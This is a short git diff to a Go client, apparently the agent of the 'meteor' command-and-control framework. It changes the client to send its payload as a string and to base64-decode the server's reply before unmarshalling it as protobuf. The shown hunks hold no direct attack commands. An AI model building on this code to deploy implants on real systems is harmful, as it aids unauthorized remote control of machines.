@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"fmt"
 	cUtils "github.com/degenerat3/meteor/meteor/clients/utils"
 	"github.com/degenerat3/meteor/meteor/pbuf"
@@ -37,7 +38,7 @@ func main() {
 		os.Exit(0)
 	}
 	for {
-		var payload []byte
+		var payload string
 		regstat := cUtils.CheckRegStatus(REGFILE)
 		if DEBUG {
 			fmt.Printf("RegStat: %t\n", regstat)
@@ -61,17 +62,18 @@ func main() {
 		if DEBUG {
 			fmt.Printf("Writing payload to conn...\n")
 		}
-		conn.Write(payload)
+		conn.Write([]byte(payload))
 		data := make([]byte, 16384)
 		if DEBUG {
 			fmt.Printf("Reading data from conn...\n")
 		}
 		conn.Read(data)
+		decoded, err := base64.StdEncoding.DecodeString(string(data))
 		if DEBUG {
-			fmt.Printf("Got response: %s\n", data)
+			fmt.Printf("Got response: %s\n", decoded)
 		}
 		resp := &mcs.MCS{}
-		err = proto.Unmarshal(data, resp)
+		err = proto.Unmarshal(decoded, resp)
 		if err != nil {
 			if DEBUG {
 				fmt.Printf("Error unmarshalling data: %s\n", err.Error())
